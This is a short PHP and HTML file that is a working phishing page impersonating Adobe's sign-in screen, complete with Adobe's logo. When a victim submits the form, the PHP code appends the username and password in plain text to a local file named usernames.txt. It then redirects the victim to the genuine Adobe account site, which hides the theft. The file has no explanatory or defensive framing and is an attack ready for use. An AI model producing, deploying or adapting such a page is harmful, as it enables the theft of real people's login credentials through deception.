<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://account.adobe.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Adobe – Sign in</title><meta charset="UTF-8"></head>
<body style="background: #f5f5f5; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="background: white; width: 400px; margin: auto; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
<img src="https://www.adobe.com/content/dam/cc/icons/adobe-logo.svg" width="100"><br>
<h2>Sign in</h2>
<form method="post">
<input type="text" name="username" placeholder="Email" style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;" required><br>
<button type="submit" style="background: #eb1000; color: white; width: 95%; padding: 12px; border: none; border-radius: 4px;">Sign in</button>
</form>
</div>
</body>
</html>
